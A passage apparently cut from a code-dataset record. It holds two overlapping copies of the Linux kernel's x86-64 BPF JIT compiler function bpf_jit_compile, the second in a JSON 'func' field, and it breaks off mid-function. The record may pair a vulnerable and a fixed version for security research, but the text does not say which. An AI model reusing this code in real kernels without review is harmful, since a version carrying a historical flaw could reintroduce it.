/* A *= K */\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x6b, 0xc0, K); /* imul imm8,%eax,%eax */\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x69, 0xc0);\t\t/* imul imm32,%eax */\n\t\t\t\t\tEMIT(K, 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_DIV_X: /* A /= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x85, 0xdb);\t/* test %ebx,%ebx */\n\t\t\t\tif (pc_ret0 != -1)\n\t\t\t\t\tEMIT_COND_JMP(X86_JE, addrs[pc_ret0] - (addrs[i] - 4));\n\t\t\t\telse {\n\t\t\t\t\tEMIT_COND_JMP(X86_JNE, 2 + 5);\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t\tEMIT1_off32(0xe9, cleanup_addr - (addrs[i] - 4)); /* jmp .+off32 */\n\t\t\t\t}\n\t\t\t\tEMIT4(0x31, 0xd2, 0xf7, 0xf3); /* xor %edx,%edx; div %ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_DIV_K: /* A = reciprocal_divide(A, K); */\n\t\t\t\tEMIT3(0x48, 0x69, 0xc0); /* imul imm32,%rax,%rax */\n\t\t\t\tEMIT(K, 4);\n\t\t\t\tEMIT4(0x48, 0xc1, 0xe8, 0x20); /* shr $0x20,%rax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_AND_X:\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x21, 0xd8);\t\t/* and %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_AND_K:\n\t\t\t\tif (K >= 0xFFFFFF00) {\n\t\t\t\t\tEMIT2(0x24, K & 0xFF); /* and imm8,%al */\n\t\t\t\t} else if (K >= 0xFFFF0000) {\n\t\t\t\t\tEMIT2(0x66, 0x25);\t/* and imm16,%ax */\n\t\t\t\t\tEMIT2(K, 2);\n\t\t\t\t} else {\n\t\t\t\t\tEMIT1_off32(0x25, K);\t/* and imm32,%eax */\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_OR_X:\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x09, 0xd8);\t\t/* or %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_OR_K:\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xc8, K); /* or imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x0d, K);\t/* or imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_LSH_X: /* A <<= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT4(0x89, 0xd9, 0xd3, 0xe0);\t/* mov %ebx,%ecx; shl %cl,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_LSH_K:\n\t\t\t\tif (K == 0)\n\t\t\t\t\tbreak;\n\t\t\t\telse if (K == 1)\n\t\t\t\t\tEMIT2(0xd1, 0xe0); /* shl %eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT3(0xc1, 0xe0, K);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_RSH_X: /* A >>= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT4(0x89, 0xd9, 0xd3, 0xe8);\t/* mov %ebx,%ecx; shr %cl,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_RSH_K: /* A >>= K; */\n\t\t\t\tif (K == 0)\n\t\t\t\t\tbreak;\n\t\t\t\telse if (K == 1)\n\t\t\t\t\tEMIT2(0xd1, 0xe8); /* shr %eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT3(0xc1, 0xe8, K);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_NEG:\n\t\t\t\tEMIT2(0xf7, 0xd8);\t\t/* neg %eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_RET_K:\n\t\t\t\tif (!K) {\n\t\t\t\t\tif (pc_ret0 == -1)\n\t\t\t\t\t\tpc_ret0 = i;\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t} else {\n\t\t\t\t\tEMIT1_off32(0xb8, K);\t/* mov $imm32,%eax */\n\t\t\t\t}\n\t\t\t\t/* fallinto */\n\t\t\tcase BPF_S_RET_A:\n\t\t\t\tif (seen) {\n\t\t\t\t\tif (i != flen - 1) {\n\t\t\t\t\t\tEMIT_JMP(cleanup_addr - addrs[i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tif (seen & SEEN_XREG)\n\t\t\t\t\t\tEMIT4(0x48, 0x8b, 0x5d, 0xf8);  /* mov  -8(%rbp),%rbx */\n\t\t\t\t\tEMIT1(0xc9);\t\t/* leaveq */\n\t\t\t\t}\n\t\t\t\tEMIT1(0xc3);\t\t/* ret */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_MISC_TAX: /* X = A */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x89, 0xc3);\t/* mov    %eax,%ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_MISC_TXA: /* A = X */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x89, 0xd8);\t/* mov    %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_IMM: /* A = K */\n\t\t\t\tif (!K)\n\t\t\t\t\tCLEAR_A();\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0xb8, K); /* mov $imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_IMM: /* X = K */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tif (!K)\n\t\t\t\t\tCLEAR_X();\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0xbb, K); /* mov $imm32,%ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_MEM: /* A = mem[K] : mov off8(%rbp),%eax */\n\t\t\t\tseen |= SEEN_MEM;\n\t\t\t\tEMIT3(0x8b, 0x45, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_MEM: /* X = mem[K] : mov off8(%rbp),%ebx */\n\t\t\t\tseen |= SEEN_XREG | SEEN_MEM;\n\t\t\t\tEMIT3(0x8b, 0x5d, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ST: /* mem[K] = A : mov %eax,off8(%rbp) */\n\t\t\t\tseen |= SEEN_MEM;\n\t\t\t\tEMIT3(0x89, 0x45, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_STX: /* mem[K] = X : mov %ebx,off8(%rbp) */\n\t\t\t\tseen |= SEEN_XREG | SEEN_MEM;\n\t\t\t\tEMIT3(0x89, 0x5d, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_LEN: /*\tA = skb->len; */\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, len) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, len)))\n\t\t\t\t\t/* mov    off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_W_LEN: /* X = skb->len; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, len)))\n\t\t\t\t\t/* mov off8(%rdi),%ebx */\n\t\t\t\t\tEMIT3(0x8b, 0x5f, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x8b, 0x9f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_PROTOCOL: /* A = ntohs(skb->protocol); */\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, protocol) != 2);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, protocol))) {\n\t\t\t\t\t/* movzwl off8(%rdi),%eax */\n\t\t\t\t\tEMIT4(0x0f, 0xb7, 0x47, offsetof(struct sk_buff, protocol));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x0f, 0xb7, 0x87); /* movzwl off32(%rdi),%eax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, protocol), 4);\n\t\t\t\t}\n\t\t\t\tEMIT2(0x86, 0xc4); /* ntohs() : xchg   %al,%ah */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_IFINDEX:\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, dev))) {\n\t\t\t\t\t/* movq off8(%rdi),%rax */\n\t\t\t\t\tEMIT4(0x48, 0x8b, 0x47, offsetof(struct sk_buff, dev));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x48, 0x8b, 0x87); /* movq off32(%rdi),%rax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, dev), 4);\n\t\t\t\t}\n\t\t\t\tEMIT3(0x48, 0x85, 0xc0);\t/* test %rax,%rax */\n\t\t\t\tEMIT_COND_JMP(X86_JE, cleanup_addr - (addrs[i] - 6));\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct net_device, ifindex) != 4);\n\t\t\t\tEMIT2(0x8b, 0x80);\t/* mov off32(%rax),%eax */\n\t\t\t\tEMIT(offsetof(struct net_device, ifindex), 4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_MARK:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, mark) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, mark))) {\n\t\t\t\t\t/* mov off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, mark));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, mark), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_RXHASH:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, rxhash) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, rxhash))) {\n\t\t\t\t\t/* mov off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, rxhash));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, rxhash), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_QUEUE:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, queue_mapping) != 2);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, queue_mapping))) {\n\t\t\t\t\t/* movzwl off8(%rdi),%eax */\n\t\t\t\t\tEMIT4(0x0f, 0xb7, 0x47, offsetof(struct sk_buff, queue_mapping));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x0f, 0xb7, 0x87); /* movzwl off32(%rdi),%eax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, queue_mapping), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_CPU:\n#ifdef CONFIG_SMP\n\t\t\t\tEMIT4(0x65, 0x8b, 0x04, 0x25); /* mov %gs:off32,%eax */\n\t\t\t\tEMIT((u32)(unsigned long)&cpu_number, 4); /* A = smp_processor_id(); */\n#else\n\t\t\t\tCLEAR_A();\n#endif\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_ABS:\n\t\t\t\tfunc = sk_load_word;\ncommon_load:\t\t\tseen |= SEEN_DATAREF;\n\t\t\t\tif ((int)K < 0)\n\t\t\t\t\tgoto out;\n\t\t\t\tt_offset = func - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K); /* mov imm32,%esi */\n\t\t\t\tEMIT1_off32(0xe8, t_offset); /* call */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_H_ABS:\n\t\t\t\tfunc = sk_load_half;\n\t\t\t\tgoto common_load;\n\t\t\tcase BPF_S_LD_B_ABS:\n\t\t\t\tfunc = sk_load_byte;\n\t\t\t\tgoto common_load;\n\t\t\tcase BPF_S_LDX_B_MSH:\n\t\t\t\tif ((int)K < 0) {\n\t\t\t\t\tif (pc_ret0 != -1) {\n\t\t\t\t\t\tEMIT_JMP(addrs[pc_ret0] - addrs[i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t\tEMIT_JMP(cleanup_addr - addrs[i]);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tseen |= SEEN_DATAREF | SEEN_XREG;\n\t\t\t\tt_offset = sk_load_byte_msh - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K);\t/* mov imm32,%esi */\n\t\t\t\tEMIT1_off32(0xe8, t_offset); /* call sk_load_byte_msh */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_IND:\n\t\t\t\tfunc = sk_load_word_ind;\ncommon_load_ind:\t\tseen |= SEEN_DATAREF | SEEN_XREG;\n\t\t\t\tt_offset = func - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K);\t/* mov imm32,%esi   */\n\t\t\t\tEMIT1_off32(0xe8, t_offset);\t/* call sk_load_xxx_ind */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_H_IND:\n\t\t\t\tfunc = sk_load_half_ind;\n\t\t\t\tgoto common_load_ind;\n\t\t\tcase BPF_S_LD_B_IND:\n\t\t\t\tfunc = sk_load_byte_ind;\n\t\t\t\tgoto common_load_ind;\n\t\t\tcase BPF_S_JMP_JA:\n\t\t\t\tt_offset = addrs[i + K] - addrs[i];\n\t\t\t\tEMIT_JMP(t_offset);\n\t\t\t\tbreak;\n\t\t\tCOND_SEL(BPF_S_JMP_JGT_K, X86_JA, X86_JBE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGE_K, X86_JAE, X86_JB);\n\t\t\tCOND_SEL(BPF_S_JMP_JEQ_K, X86_JE, X86_JNE);\n\t\t\tCOND_SEL(BPF_S_JMP_JSET_K,X86_JNE, X86_JE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGT_X, X86_JA, X86_JBE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGE_X, X86_JAE, X86_JB);\n\t\t\tCOND_SEL(BPF_S_JMP_JEQ_X, X86_JE, X86_JNE);\n\t\t\tCOND_SEL(BPF_S_JMP_JSET_X,X86_JNE, X86_JE);\n\ncond_branch:\t\t\tf_offset = addrs[i + filter[i].jf] - addrs[i];\n\t\t\t\tt_offset = addrs[i + filter[i].jt] - addrs[i];\n\n\t\t\t\t/* same targets, can avoid doing the test :) */\n\t\t\t\tif (filter[i].jt == filter[i].jf) {\n\t\t\t\t\tEMIT_JMP(t_offset);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tswitch (filter[i].code) {\n\t\t\t\tcase BPF_S_JMP_JGT_X:\n\t\t\t\tcase BPF_S_JMP_JGE_X:\n\t\t\t\tcase BPF_S_JMP_JEQ_X:\n\t\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\t\tEMIT2(0x39, 0xd8); /* cmp %ebx,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JSET_X:\n\t\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\t\tEMIT2(0x85, 0xd8); /* test %ebx,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JEQ_K:\n\t\t\t\t\tif (K == 0) {\n\t\t\t\t\t\tEMIT2(0x85, 0xc0); /* test   %eax,%eax */\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tcase BPF_S_JMP_JGT_K:\n\t\t\t\tcase BPF_S_JMP_JGE_K:\n\t\t\t\t\tif (K <= 127)\n\t\t\t\t\t\tEMIT3(0x83, 0xf8, K); /* cmp imm8,%eax */\n\t\t\t\t\telse\n\t\t\t\t\t\tEMIT1_off32(0x3d, K); /* cmp imm32,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JSET_K:\n\t\t\t\t\tif (K <= 0xFF)\n\t\t\t\t\t\tEMIT2(0xa8, K); /* test imm8,%al */\n\t\t\t\t\telse if (!(K & 0xFFFF00FF))\n\t\t\t\t\t\tEMIT3(0xf6, 0xc4, K >> 8); /* test imm8,%ah */\n\t\t\t\t\telse if (K <= 0xFFFF) {\n\t\t\t\t\t\tEMIT2(0x66, 0xa9); /* test imm16,%ax */\n\t\t\t\t\t\tEMIT(K, 2);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tEMIT1_off32(0xa9, K); /* test imm32,%eax */\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tif (filter[i].jt != 0) {\n\t\t\t\t\tif (filter[i].jf)\n\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 6;\n\t\t\t\t\tEMIT_COND_JMP(t_op, t_offset);\n\t\t\t\t\tif (filter[i].jf)\n\t\t\t\t\t\tEMIT_JMP(f_offset);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tEMIT_COND_JMP(f_op, f_offset);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\t/* hmm, too complex filter, give up with jit compiler */\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tilen = prog - temp;\n\t\t\tif (image) {\n\t\t\t\tif (unlikely(proglen + ilen > oldproglen)) {\n\t\t\t\t\tpr_err(\"bpb_jit_compile fatal error\\n\");\n\t\t\t\t\tkfree(addrs);\n\t\t\t\t\tmodule_free(NULL, image);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tmemcpy(image + proglen, temp, ilen);\n\t\t\t}\n\t\t\tproglen += ilen;\n\t\t\taddrs[i] = proglen;\n\t\t\tprog = temp;\n\t\t}\n\t\t/* last bpf instruction is always a RET :\n\t\t * use it to give the cleanup instruction(s) addr\n\t\t */\n\t\tcleanup_addr = proglen - 1; /* ret */\n\t\tif (seen)\n\t\t\tcleanup_addr -= 1; /* leaveq */\n\t\tif (seen & SEEN_XREG)\n\t\t\tcleanup_addr -= 4; /* mov  -8(%rbp),%rbx */\n\n\t\tif (image) {\n\t\t\tWARN_ON(proglen != oldproglen);\n\t\t\tbreak;\n\t\t}\n\t\tif (proglen == oldproglen) {\n\t\t\timage = module_alloc(max_t(unsigned int,\n\t\t\t\t\t\t   proglen,\n\t\t\t\t\t\t   sizeof(struct work_struct)));\n\t\t\tif (!image)\n\t\t\t\tgoto out;\n\t\t}\n\t\toldproglen = proglen;\n\t}\n\tif (bpf_jit_enable > 1)\n\t\tpr_err(\"flen=%d proglen=%u pass=%d image=%p\\n\",\n\t\t       flen, proglen, pass, image);\n\n\tif (image) {\n\t\tif (bpf_jit_enable > 1)\n\t\t\tprint_hex_dump(KERN_ERR, \"JIT code: \", DUMP_PREFIX_ADDRESS,\n\t\t\t\t       16, 1, image, proglen, false);\n\n\t\tbpf_flush_icache(image, image + proglen);\n\n\t\tfp->bpf_func = (void *)image;\n\t}\nout:\n\tkfree(addrs);\n\treturn;\n}",
        "func": "void bpf_jit_compile(struct sk_filter *fp)\n{\n\tu8 temp[64];\n\tu8 *prog;\n\tunsigned int proglen, oldproglen = 0;\n\tint ilen, i;\n\tint t_offset, f_offset;\n\tu8 t_op, f_op, seen = 0, pass;\n\tu8 *image = NULL;\n\tu8 *func;\n\tint pc_ret0 = -1; /* bpf index of first RET #0 instruction (if any) */\n\tunsigned int cleanup_addr; /* epilogue code offset */\n\tunsigned int *addrs;\n\tconst struct sock_filter *filter = fp->insns;\n\tint flen = fp->len;\n\n\tif (!bpf_jit_enable)\n\t\treturn;\n\n\taddrs = kmalloc(flen * sizeof(*addrs), GFP_KERNEL);\n\tif (addrs == NULL)\n\t\treturn;\n\n\t/* Before first pass, make a rough estimation of addrs[]\n\t * each bpf instruction is translated to less than 64 bytes\n\t */\n\tfor (proglen = 0, i = 0; i < flen; i++) {\n\t\tproglen += 64;\n\t\taddrs[i] = proglen;\n\t}\n\tcleanup_addr = proglen; /* epilogue address */\n\n\tfor (pass = 0; pass < 10; pass++) {\n\t\t/* no prologue/epilogue for trivial filters (RET something) */\n\t\tproglen = 0;\n\t\tprog = temp;\n\n\t\tif (seen) {\n\t\t\tEMIT4(0x55, 0x48, 0x89, 0xe5); /* push %rbp; mov %rsp,%rbp */\n\t\t\tEMIT4(0x48, 0x83, 0xec, 96);\t/* subq  $96,%rsp\t*/\n\t\t\t/* note : must save %rbx in case bpf_error is hit */\n\t\t\tif (seen & (SEEN_XREG | SEEN_DATAREF))\n\t\t\t\tEMIT4(0x48, 0x89, 0x5d, 0xf8); /* mov %rbx, -8(%rbp) */\n\t\t\tif (seen & SEEN_XREG)\n\t\t\t\tCLEAR_X(); /* make sure we dont leek kernel memory */\n\n\t\t\t/*\n\t\t\t * If this filter needs to access skb data,\n\t\t\t * loads r9 and r8 with :\n\t\t\t *  r9 = skb->len - skb->data_len\n\t\t\t *  r8 = skb->data\n\t\t\t */\n\t\t\tif (seen & SEEN_DATAREF) {\n\t\t\t\tif (offsetof(struct sk_buff, len) <= 127)\n\t\t\t\t\t/* mov    off8(%rdi),%r9d */\n\t\t\t\t\tEMIT4(0x44, 0x8b, 0x4f, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\t/* mov    off32(%rdi),%r9d */\n\t\t\t\t\tEMIT3(0x44, 0x8b, 0x8f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, data_len)))\n\t\t\t\t\t/* sub    off8(%rdi),%r9d */\n\t\t\t\t\tEMIT4(0x44, 0x2b, 0x4f, offsetof(struct sk_buff, data_len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT3(0x44, 0x2b, 0x8f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, data_len), 4);\n\t\t\t\t}\n\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, data)))\n\t\t\t\t\t/* mov off8(%rdi),%r8 */\n\t\t\t\t\tEMIT4(0x4c, 0x8b, 0x47, offsetof(struct sk_buff, data));\n\t\t\t\telse {\n\t\t\t\t\t/* mov off32(%rdi),%r8 */\n\t\t\t\t\tEMIT3(0x4c, 0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, data), 4);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tswitch (filter[0].code) {\n\t\tcase BPF_S_RET_K:\n\t\tcase BPF_S_LD_W_LEN:\n\t\tcase BPF_S_ANC_PROTOCOL:\n\t\tcase BPF_S_ANC_IFINDEX:\n\t\tcase BPF_S_ANC_MARK:\n\t\tcase BPF_S_ANC_RXHASH:\n\t\tcase BPF_S_ANC_CPU:\n\t\tcase BPF_S_ANC_QUEUE:\n\t\tcase BPF_S_LD_W_ABS:\n\t\tcase BPF_S_LD_H_ABS:\n\t\tcase BPF_S_LD_B_ABS:\n\t\t\t/* first instruction sets A register (or is RET 'constant') */\n\t\t\tbreak;\n\t\tdefault:\n\t\t\t/* make sure we dont leak kernel information to user */\n\t\t\tCLEAR_A(); /* A = 0 */\n\t\t}\n\n\t\tfor (i = 0; i < flen; i++) {\n\t\t\tunsigned int K = filter[i].k;\n\n\t\t\tswitch (filter[i].code) {\n\t\t\tcase BPF_S_ALU_ADD_X: /* A += X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x01, 0xd8);\t\t/* add %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_ADD_K: /* A += K; */\n\t\t\t\tif (!K)\n\t\t\t\t\tbreak;\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xc0, K);\t/* add imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x05, K);\t/* add imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_SUB_X: /* A -= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x29, 0xd8);\t\t/* sub    %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_SUB_K: /* A -= K */\n\t\t\t\tif (!K)\n\t\t\t\t\tbreak;\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xe8, K); /* sub imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x2d, K); /* sub imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_MUL_X: /* A *= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT3(0x0f, 0xaf, 0xc3);\t/* imul %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_MUL_K: /* A *= K */\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x6b, 0xc0, K); /* imul imm8,%eax,%eax */\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x69, 0xc0);\t\t/* imul imm32,%eax */\n\t\t\t\t\tEMIT(K, 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_DIV_X: /* A /= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x85, 0xdb);\t/* test %ebx,%ebx */\n\t\t\t\tif (pc_ret0 != -1)\n\t\t\t\t\tEMIT_COND_JMP(X86_JE, addrs[pc_ret0] - (addrs[i] - 4));\n\t\t\t\telse {\n\t\t\t\t\tEMIT_COND_JMP(X86_JNE, 2 + 5);\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t\tEMIT1_off32(0xe9, cleanup_addr - (addrs[i] - 4)); /* jmp .+off32 */\n\t\t\t\t}\n\t\t\t\tEMIT4(0x31, 0xd2, 0xf7, 0xf3); /* xor %edx,%edx; div %ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_DIV_K: /* A = reciprocal_divide(A, K); */\n\t\t\t\tEMIT3(0x48, 0x69, 0xc0); /* imul imm32,%rax,%rax */\n\t\t\t\tEMIT(K, 4);\n\t\t\t\tEMIT4(0x48, 0xc1, 0xe8, 0x20); /* shr $0x20,%rax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_AND_X:\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x21, 0xd8);\t\t/* and %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_AND_K:\n\t\t\t\tif (K >= 0xFFFFFF00) {\n\t\t\t\t\tEMIT2(0x24, K & 0xFF); /* and imm8,%al */\n\t\t\t\t} else if (K >= 0xFFFF0000) {\n\t\t\t\t\tEMIT2(0x66, 0x25);\t/* and imm16,%ax */\n\t\t\t\t\tEMIT2(K, 2);\n\t\t\t\t} else {\n\t\t\t\t\tEMIT1_off32(0x25, K);\t/* and imm32,%eax */\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_OR_X:\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x09, 0xd8);\t\t/* or %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_OR_K:\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xc8, K); /* or imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x0d, K);\t/* or imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_LSH_X: /* A <<= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT4(0x89, 0xd9, 0xd3, 0xe0);\t/* mov %ebx,%ecx; shl %cl,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_LSH_K:\n\t\t\t\tif (K == 0)\n\t\t\t\t\tbreak;\n\t\t\t\telse if (K == 1)\n\t\t\t\t\tEMIT2(0xd1, 0xe0); /* shl %eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT3(0xc1, 0xe0, K);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_RSH_X: /* A >>= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT4(0x89, 0xd9, 0xd3, 0xe8);\t/* mov %ebx,%ecx; shr %cl,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_RSH_K: /* A >>= K; */\n\t\t\t\tif (K == 0)\n\t\t\t\t\tbreak;\n\t\t\t\telse if (K == 1)\n\t\t\t\t\tEMIT2(0xd1, 0xe8); /* shr %eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT3(0xc1, 0xe8, K);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_NEG:\n\t\t\t\tEMIT2(0xf7, 0xd8);\t\t/* neg %eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_RET_K:\n\t\t\t\tif (!K) {\n\t\t\t\t\tif (pc_ret0 == 